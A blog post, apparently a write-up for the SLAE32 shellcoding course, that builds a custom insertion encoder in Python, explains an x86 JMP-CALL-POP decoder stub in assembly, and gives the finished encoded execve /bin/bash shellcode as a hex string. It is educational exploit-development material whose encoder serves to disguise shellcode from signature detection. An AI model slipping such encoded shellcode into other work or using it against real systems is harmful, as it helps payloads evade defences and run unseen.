---
layout: post
title:  "SLAE32"
subtitle: "|  Assignment 4 - Encoder"
date:   2022-10-02 08:45:58 +0200
category: SLAE32
subject: Assignment 4 - Encoder
excerpt_separator: <!--more-->
github-link: TODO
---

###  <span style="color:#2d8fb3;"> Description of the assignment </span>

- Create a custom encoding scheme like the "Insertion Encoder" we showed you;
- PoC with using execve-stack as the shellcode to encode with your schema and execute.
 
<!--more-->

###  <span style="color:#2d8fb3;"> Principal </span>

In this assignment, we will create a custom Incremental Insertion Encoder.

Here an exemple of how the encoder will works :

Original shellcode :

    0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8,0x9,0x10

Encoded shellcode :

    0x1,0xAA,0x2,0x3,0xAA,0xAA,0x4,0x5,0x6,0xAA,0xAA,0xAA,0x7,0x8,0x9,0x10,0xbb,0xbb,0xbb,0xbb

###  <span style="color:#2d8fb3;"> Encoder </span>

In this section, you will find a python script which will encode the source shellcode in the right format.

The structure of the code is as follows :

1) It retrieves the size of the shellcode and compute how many set of the data there will be, the size of the last set and deducts with those information the number of values remaining in the last set.

2) Then, it builds our encoded shellcode by retrieving set by set the values from our shellcode until the ultimate set.

3) Because the last set might not be completely fulfilled, it will only retrieve from the shellcode the number of values that remains.

4) It inserts the EGG at the end of the shellcode.

5) And finally, it prints our encoded shellcode.

#### Result:

<img src="/assets/slae32-img/assignment4/inc-ins.PNG" alt="drawing" style="width:900px;"/>

#### Code

    #!/usr/bin/python

    import sys

    input = sys.argv[1] 

    print 'String length : '+ str(len(input))

    ### Initialization of the Lists
    # Retrieve the shellcode and insert it into a list
    stringList = [input[i:i+4] for i in range(0, len(input), 4)]
    # Empty list for our encoded shellcode
    stringListEncoded = []


    ### First part to compute the number of set, the size of the last set and the number of value in the last set
    #Counters
    nbSet = 0
    length = len(stringList)
    valPos = 1
    lengthSet = 1

    print "length" + str(length)

    # Compute how many set of data there will be.
    while valPos <= length:
        valPos = valPos + lengthSet  
        lengthSet = lengthSet + 1
        nbSet = nbSet + 1

    # Compute how many value are in the last set
    l = valPos - lengthSet
    supplIt = length - (valPos - lengthSet)
    print(supplIt) #nb iterations supplementaires


    ### Second part, build the encoded shellcode   
    # Counters
    nbInsertion = 1
    posValue = 0
    nbValueToMove = 1
    savedPosValue = 0

    # Iteration until nbSet-1 
    while nbInsertion <= (nbSet - 1): 
        nbVal = 0
        while nbVal < nbInsertion : # nb value to move = nb insertion
            val = '0x%02s' % stringList[posValue + nbVal][2:]
            stringListEncoded.append(val) # Insert the value in the list for the encoded shellcode     
            nbVal = nbVal + 1

        # Encoding insertion 0xaa
        nbEncode = 0
        while nbEncode < nbInsertion:
            encoder =  '0x%02x' % 0xaa
            stringListEncoded.append(encoder) #insert
            nbEncode = nbEncode + 1
        
        # Increment counters
        savedPosValue = posValue
        posValue = posValue + nbInsertion 
        nbInsertion = nbInsertion + 1
        
    # Last iteration
    it = 0
    while it < supplIt:
        val = '0x%02s' % stringList[posValue+it][2:]
        stringListEncoded.append(val) #insert 
        it = it + 1


    # Insertion of the Egg at the end
    for i in range(4):
        encoder = '0x%02x' % 0xbb
        stringListEncoded.append(encoder) #insert 

    # Convert the list into the good format and display the result
    finalvalue = ""
    for val in stringListEncoded:
        finalvalue = finalvalue + str(val) + ','

    print finalvalue


###  <span style="color:#2d8fb3;"> Decoder shellcode </span>

Now that we have our encoded shellcode, we will have to create our assembly code which go throught our encoded shellcode, retrieves the interesting part, replace them in the desired position and when finally the "Egg" is found, execute it.

First, we used the JMP-CALL-POP technic to retrieve the address of our encoded shellcode and stored it in ESI.

    _start:
        jmp short calldecoder ; jump to the calldecoder section
    .....
    ...
    ..
    decoder : 
        pop esi ; retrieve the address of the EncodedShellcode	
        .....
        ...
        ..
    calldecoder : 
        call decoder
        EncodedShellcode : db 0x1,0xAA,0x2,0x3,0xAA,0xAA,0x4,0x5,0x6,0xAA,0xAA,0xAA,0x7,0x8,0x9,0x10,0xbb,0xbb,0xbb,0xbb


Then, we initialized our counters and registers.

- Initialization of our counter EDX to 1 :

        mov dl, 0x1 ; Initialize the counter to 1

- Initialization of the EBX register which represent the number of shift from the ESI register to point to the first value of the set of value that we want to retrieve :

	    xor ebx, ebx 
	
- Initialization of the EDI register which point to the address where we want to write

	    mov edi, esi 


The next step is to create our function which will go from on set of values to the next one and check that we didn't arrive at the end of our shellcode.

To check if we arrived at the end of our shellcode, we inserted an Egg "0xbbbbbbbb" at the end of it, so that we only need to check if the next 4 bytes match with our egg. And in case of a match, we jump to our shellcode to execute it.

    nextSetValues : 
        cmp dword [esi + ebx + 0x4], 0xbbbbbbbb
        je EncodedShellcode

In the situation that we didn't find our egg, we search for the place to write by adding the value of the counter EDX to the EDI register.

    lea edi, [edi + edx]

Once we find where we want to write, we need to locate the set of value that we want to retrieve. To find them, we use the arithmetic computation "EBX = EBX + 2*EDX".

    mov al, 2 ; Intialize the value of eax to 2	
	mul dl	; Multiply EAX with EDX (2*edx)
	add eax, ebx  ; Add EBX to EAX (EAX = EBX + 2*EDX)
	mov ebx, eax ; mov into EBX the valu of EAX
	

We can notice that the counter's value is equal to the number of value that we need to copy :
- Counter EDX = 1, number of value to copy is 1
- Counter EDX = 2, number of value to copy is 2
- etc...

So we need to create a function which has another counter (ECX) that copy each value in the set of value that we need to retrieve (ESI + EBX + ECX) into the proper location (EDI + ECX) until that counter is less or equal to the counter EDX.

        xor ecx, ecx 			; Init the counter to zero

    nextValues :
        pusha ; Save registers state
        ; Find the location where we want to write the value
        xor eax, eax
        lea eax, [edi + ecx]                ; Value at EDI + ECX

        ;Find the value that we want to retrieve and copy in the location previously found
        add ebx, ecx                        ; EBX + ECX
        lea edx, [esi + ebx]                ; lea edx, [esi + ebx + ecx]
        mov bl, byte [edx] 			; mov the value into bl
        mov byte [eax], bl 			; mov the value we temporary stored at bl into al

        popa				; Restore the registers
        
        inc ecx			        ; Increment the counter to go to the next value of the set
        cmp ecx, edx		        ; Compare EDX and ECX		
        jle short nextValues                ; If the same value, no more value to move

Then, if the counter ECX is greater than EDX, we need to go to the next set of value.

	inc edx					; Increment the counter
	jmp short nextSetValues			; Go to the next set of value to retrieve

In this assessment, we used the JMP-CALL-POP Execve shellcode from the exercise as follows :

    \x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80

Then, we used the python encoded (see picture section Encoder) to encoded it.

    0x31,0xaa,0xc0,0x50,0xaa,0xaa,0x68,0x62,0x61,0xaa,0xaa,0xaa,0x73,0x68,0x68,0x62,0xaa,0xaa,0xaa,0xaa,0x69,0x6e,0x2f,0x68,0x2f,0xaa,0xaa,0xaa,0xaa,0xaa,0x2f,0x2f,0x2f,0x89,0xe3,0x50,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xaa,0xcd,0x80,0xbb,0xbb,0xbb,0xbb


Finally we compile our shellcode by doing the following steps :

First, we compiled our assembly code :

    nasm -f elf -o ExecEncodedShellcode.o ExecEncodedShellcode.nasm
    ld -m elf_i386 ExecEncodedShellcode.o -o ExecEncodedShellcode


Then, we used the objdump tool to retrieve our shellcode intructions :

    objdump -d ExecEncodedShellcode|grep '[0-9a-f]:'|sed -n '1!p'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

Which gave the following result:
    
    "\xeb\x3f\x31\xf6\x5e\x31\xd2\xb2\x01\x31\xdb\x31\xff\x89\xf7\x31\xc0\x31\xc9\x8d\x3c\x17\xb0\x02\xf6\xe2\x01\xd8\x89\xc3\x31\xc9\x60\x31\xc0\x8d\x04\x0f\x01\xcb\x81\x3c\x1e\xbb\xbb\xbb\xbb\x74\x15\x8d\x14\x1e\x8a\x1a\x88\x18\x61\x41\x39\xd1\x7e\xe2\x42\xeb\xd2\xe8\xbc\xff\xff\xff\x31\xaa\xc0\x50\xaa\xaa\x68\x62\x61\xaa\xaa\xaa\x73\x68\x68\x62\xaa\xaa\xaa\xaa\x69\x6e\x2f\x68\x2f\xaa\xaa\xaa\xaa\xaa\x2f\x2f\x2f\x89\xe3\x50\xaa\xaa\xaa\xaa\xaa\xaa\x89\xe2\x53\x89\xe1\xb0\x0b\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xcd\x80\xbb\xbb\xbb\xbb"



And finally we insert the shellcode in our C file, compiled it and launched it :


**Result**

<img src="/assets/slae32-img/assignment4/final.PNG" alt="drawing" style="width:900px;"/>
